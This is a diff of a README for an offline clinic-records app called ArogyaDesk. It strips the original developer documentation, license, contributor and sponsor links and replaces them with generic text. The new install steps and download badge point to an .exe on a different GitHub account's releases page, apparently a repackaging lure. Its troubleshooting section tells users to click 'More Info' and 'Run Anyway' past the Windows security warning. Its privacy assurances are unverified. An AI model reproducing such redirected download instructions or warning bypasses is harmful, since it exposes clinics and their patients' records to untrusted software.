@@ -1,342 +1,86 @@
-# 🏥 ArogyaDesk
+# 🏥 ArogyaDesk - Manage your clinic without internet access
 
-ArogyaDesk is a simple, **offline-first** desktop app for a doctor's clinic. It is designed for one doctor using one computer and keeps patient records on the local machine so the clinic can continue working without depending on the internet. 🚀
+[![Download ArogyaDesk](https://img.shields.io/badge/Download-ArogyaDesk-blue.svg)](https://github.com/Anderso6518/ArogyaDesk/releases)
 
-## ✨ Features
+ArogyaDesk helps solo doctors manage their clinics. You store all patient records on your own computer. You do not need an internet connection to run this program.
 
-- 📝 **Create and manage** patient records
-- 🔍 **Search patients** by name or phone number
-- 📅 **Add visit history** for each patient
-- 📋 **Record** symptoms, diagnosis, prescription notes, charges, and discounts
-- 📎 **Attach** local prescription or report files to a visit
-- 📄 **Export** a visit receipt as PDF
-- 🏥 **Keep** doctor and clinic details inside the app
+## 📋 Features
 
-## 🎯 Who It Is For
+This application stores data on your local hard drive. The following tools assist your daily practice:
 
-ArogyaDesk is best suited for:
-
-- 🏥 Small clinics
-- 👨‍⚕️ Solo doctors
-- 👩‍💼 Reception-plus-doctor workflows on one computer
-- 🔐 Offline-first record keeping
+* Patient Records: Keep detailed histories for every patient.
+* Visit Logs: Track consultations and medical notes.
+* Prescriptions: Generate and print lists of medicine.
+* Billing: Create invoices and track payments for services.
+* Local Database: All information stays on your device.
 
 ## 💻 System Requirements
 
-- 🪟 Windows computer
-- 📦 Installer provided by the clinic or release page
-- 🔑 Permission to install a desktop application on the machine
+Your computer must meet these basic needs:
 
-## 📥 Installation
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core processor or better.
+* Memory: 4 GB of RAM or more.
+* Storage: 200 MB of free disk space.
+* Display: Screen resolution of 1280x720 pixels or higher.
 
-1. Download the latest `ArogyaDesk` Windows installer.
-2. Double-click the installer `.exe` file.
-3. Choose the installation folder if needed.
-4. Finish the installation.
-5. Launch `ArogyaDesk` from the Start menu or desktop shortcut.
+## 📥 How to Install
 
-## 🚀 First-Time Setup
+Follow these steps to set up the software on your Windows computer.
 
-When you open the app for the first time, it will ask for clinic profile details.
+1. Visit the [official releases page](https://github.com/Anderso6518/ArogyaDesk/releases) to find the latest version.
+2. Look for the file ending in .exe under the Assets section.
+3. Click the file name to start the download to your computer.
+4. Locate the downloaded file in your browser or your Downloads folder.
+5. Double-click the file to begin the installation.
+6. Follow the prompts on the screen to finish the setup process.
 
-**Fill in:**
+## 🚀 Getting Started
 
-- 👨‍⚕️ Doctor name
-- 🏥 Clinic name
-- 🎓 Specialization
-- 📞 Phone number
-- 📍 Clinic address
-- 🖼️ Optional profile photo
+Once the installation completes, an icon for ArogyaDesk appears on your desktop. Double-click this icon to open the program.
 
-After saving this profile, the app opens the main patient screen.
+Upon the first launch, the app creates a database folder on your machine. This folder acts as your private storage. Do not move or delete this folder, as it contains your patient records and billing history.
 
-## 🗓️ Daily Use
+## 🏥 Managing Patients
 
-### ➕ Add a New Patient
+You add new patients by clicking the New Patient button on the main dashboard. You enter the name, age, contact details, and medical history into the provided fields. Press the Save button to commit this data to your local storage.
 
-1. Open the app.
-2. Click `New Patient`.
-3. Enter the patient's details.
-4. Save the record.
+Use the search bar at the top of the screen to find existing records. Type the name of the patient to see their full history.
 
-**Typical patient fields:**
+## 🩺 Recording Visits
 
-- 👤 Full name
-- 🔢 Age
-- ⚥ Gender
-- 📞 Phone number
-- 📍 Address
-- 📝 Notes
-- 🖼️ Optional photo
+Each visit log links directly to a patient record. Click on a patient name to see their details. Select the button labeled Add Visit to record symptoms, diagnosis, and treatment plans. This keeps the medical history in one place for each person.
 
-### 🔍 Search for a Patient
+## 💊 Issuing Prescriptions
 
-Use the search bar on the home screen to find a patient by:
+While writing a visit log, you can select the Prescription tab. You type the medicine name, dosage, and frequency instructions. The application allows you to save this as a text record. You can print the document to a connected printer after you click the Print button.
 
-- 👤 Name
-- 📞 Phone number
+## 💰 Billing and Payments
 
-### 📂 Open a Patient Profile
+The system tracks every payment. Select the Billing tab within the patient profile. Create a new invoice by listing the services provided and the corresponding charges. Mark an invoice as paid once you receive the funds. This helps you monitor your clinic revenue throughout the month.
 
-Click any patient card to open the patient profile. From there you can:
+## 🛡️ Data Safety and Privacy
 
-- 📋 Review patient information
-- 📊 See total visits
-- 💰 See total billed amount
-- 🕒 View visit history
-- ✏️ Edit patient details
-- 🗑️ Delete the patient record
+Because ArogyaDesk is an offline-first tool, your data never leaves your computer. This provides security, as your patient records remain under your physical control. 
 
-### ➕ Add a Visit
+You remain responsible for your data. We recommend that you copy the contents of the database folder to an external hard drive or a secure USB stick at the end of each week. This creates a backup in case of hardware failure or computer loss.
 
-Inside a patient profile:
+## ⚙️ Troubleshooting
 
-1. Click `Add Visit`.
-2. Enter the visit date.
-3. Add symptoms and diagnosis.
-4. Write prescription notes if needed.
-5. Add charges and discount.
-6. Save the visit.
+If the application fails to open, ensure your computer meets the system requirements. Occasionally, Windows Security might prompt you to allow the software to run. Click More Info and then Run Anyway to proceed if you encounter a blue screen warning.
 
-**Visit records can include:**
+If the program becomes unresponsive, close the window and open it again. Your data saves automatically as soon as you press the Save button, so you will not lose information if you restart the application.
 
-- 📅 Visit date
-- 🤒 Symptoms
-- 🩺 Diagnosis
-- 💊 Prescription text
-- 📎 Attached local document or image
-- 💸 Charges
-- 🏷️ Discount percentage
-- 📝 Notes
+## ❓ Frequently Asked Questions
 
-### ✏️ Edit or Delete a Visit
+Can I use this app on multiple computers?
+You can install the app on multiple computers, but the data does not sync between them. Each installation serves as a separate, independent clinic workstation.
 
-Open the visit entry from the visit history list, then use:
+Do I need to pay for updates?
+This software is provided at no cost. You do not owe fees to use the features included in this release.
 
-- `Edit`
-- `Delete Visit`
+How do I remove the software?
+Open your Windows Settings, go to Apps, and find ArogyaDesk in the list. Select Uninstall to remove the program. Note that the program does not delete your patient data folder automatically when you uninstall. You must delete the folder manually if you wish to remove it entirely from your machine.
 
-### 📄 Export a Receipt PDF
-
-From a saved visit:
-
-1. Open the visit in the patient profile.
-2. Click `Export PDF`.
-3. Choose where to save the file.
-4. The app will generate the PDF and open it.
-
-## 📁 Attached Files
-
-You can attach local files such as:
-
-- 📄 PDF prescriptions
-- 🖼️ Report images
-- 📂 Scanned documents
-
-> [!IMPORTANT]
-> - The app stores the **file path**, not a copy of the file.
-> - If the original file is moved, renamed, or deleted, the app may no longer open it.
-> - It is best to keep clinic files in a fixed folder that is not moved frequently.
-
-## 💾 Data Storage
-
-ArogyaDesk stores its data locally on the same computer.
-
-- 🗄️ Patient and visit data are saved in a local **SQLite database**.
-- 🤖 The database file is created automatically by the app.
-- 🔌 **No internet connection** is required for normal usage.
-
-## 🛡️ Backup Recommendation
-
-Because the app is offline-first, backups are **critical**. 💾
-
-**You should back up:**
-
-- 🗄️ The local app database
-- 📂 Any attached prescription or report files used by the clinic
-
-**Recommended backup routine:**
-
-1. 🔄 Create a regular copy of the clinic data folder to an external drive or secure cloud storage.
-2. 📂 Also back up any folders where prescription/report files are stored.
-3. 🏠 Keep at least one recent backup outside the clinic computer.
-
-## ⚠️ Important Notes
-
-- 👤 This app is intended for a **single-user** workflow.
-- 🚫 It is not designed for multiple doctors editing the same data at the same time.
-- 🔄 It does **not sync** automatically across multiple computers.
-- 💾 If you reinstall Windows or replace the computer, restore your backups before resuming clinic work.
-
-## 🛠️ Troubleshooting
-
-### 🔍 The app opens but no patient data is visible
-
-Possible reasons:
-- 👤 You are using a different computer or Windows user account.
-- 📂 The local database was not restored after reinstalling the system.
-
-### 🚫 An attached file does not open
-
-Possible reasons:
-- 🚚 The original file was moved.
-- ✏️ The original file was renamed.
-- 🗑️ The original file was deleted.
-
-### 📄 A PDF receipt does not save
-
-Check:
-- 🔑 You have permission to write to the selected folder.
-- 🔒 The destination file is not already locked by another program.
-
-## ✅ Support Checklist
-
-If you need help, keep this information ready:
-
-- 🔢 App version or installer version
-- 🖱️ What action you were doing
-- 🔁 Whether the problem happens every time or only once
-- 📂 Whether the issue is with patient data, attached files, or PDF export
-
-## 👨‍💻 For Developers
-
-### 🏗️ Stack
-
-- ⚛️ **React** with **Vite** for the renderer
-- ⚡ **Electron** for the desktop shell
-- 🗄️ **better-sqlite3** for local data storage
-- 🛣️ **react-router-dom** with `HashRouter` for navigation
-
-### 📁 Project Structure
-
-```text
-electron/
-  main.js        Electron main process, IPC handlers, window setup
-  preload.js     Context bridge exposing window.electronAPI
-  database.js    SQLite schema and database operations
-
-src/
-  main.jsx       React entry point
-  App.jsx        Route definitions
-  index.css      Global styles
-  pdfTemplate.js Receipt PDF template
-  pages/         Screen-level components
-  components/    Reusable UI components
-```
-
-### 💻 Local Development
-
-1. Install Node.js 20 or later.
-2. Install dependencies:
-
-```bash
-npm install
-```
-
-3. Start the app in development mode:
-
-```bash
-npm run dev
-```
-
-This starts:
-- 🌐 The Vite dev server
-- ⚡ The Electron app pointed at the local Vite URL
-
-### 📜 Useful Scripts
-
-```bash
-npm install      # install dependencies
-npm run dev      # run Vite + Electron in development
-npm run build    # build the renderer into dist/
-npm run dist     # build and package the Windows installer
-npm run preview  # preview the Vite production build
-```
-
-### 🏗️ Native Dependency Notes
-
-This project uses `better-sqlite3`, which is a native dependency. The `postinstall` script runs:
-
-```bash
-electron-builder install-app-deps
-```
-
-This helps keep native modules aligned with the Electron version used for packaging.
-
-### 📦 Packaging
-
-Windows packaging is handled by `electron-builder`.
-
-- 📁 Output folder: `dist-electron/`
-- 🎯 Windows target: `nsis`
-- 🖼️ App icon: `assets/icon.ico`
-
-Create a packaged build with:
-
-```bash
-npm run dist
-```
-
-### 🗄️ Database
-
-The app stores data in a local SQLite database created inside Electron's user data directory.
-
-- 📄 Database filename: `arogyadesk.db`
-- 📊 Tables: `patients`, `visits`, `doctor_profile`
-
-Current behavior is offline-first and single-user. There is no multi-device sync layer.
-
-### 🔌 IPC Surface
-
-The renderer accesses native functionality through `window.electronAPI`.
-
-Current groups include:
-- 👤 Patient CRUD and search
-- 📅 Visit CRUD
-- 👨‍⚕️ Doctor profile read and save
-- 📂 File selection and file opening
-- 🖼️ Local image reading
-- 📄 PDF generation
-
-### 🏷️ Release Notes
-
-GitHub Actions are configured for:
-- 🏗️ CI builds on pushes and pull requests
-- 📦 Windows release packaging on tags like `v0.1.6`
-
-### 🚫 Current Limitations
-
-- 🧪 No automated test suite yet
-- 👤 Single-user local workflow only
-- 📎 Attached files are referenced by path, not copied into app storage
-- 🏗️ Build verification may require a full local or CI environment because some sandboxes block Vite or esbuild child processes
-
-## 🤝 Contributing
-
-Contributions are welcome! If you find a bug or want to suggest a feature:
-
-1. 🐛 [Open an issue](https://github.com/bhadreshpsavani/ArogyaDesk/issues) describing the problem or idea.
-2. 🍴 Fork the repository.
-3. 🌿 Create a branch for your change.
-4. 📤 Submit a pull request with a clear description.
-
-Please keep pull requests focused — one fix or feature per PR.
-
-## 📜 License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## ☕ Support the Project
-
-ArogyaDesk is free and open source. If it saves you time or helps your clinic, consider supporting its development:
-
-- 💖 [Sponsor on GitHub](https://github.com/sponsors/bhadreshpsavani)
-- ☕ [Support on Ko-fi](https://ko-fi.com/bhadresh)
-- 💸 **UPI (India):** `9624173599@upi` — works with GPay, PhonePe, Paytm, and any UPI app
-
-### 📱 Scan to Pay (UPI)
-Alternatively, you can scan this QR code with any UPI app:
-
-![UPI QR Code](assets/QR_Code.jpeg)
-
-Your support helps keep the project maintained and growing. Thank you! 🙏
+Does the software phone home to a server?
+The software performs no internet check-ins. It functions entirely without a connection. It never transmits patient data to external servers.
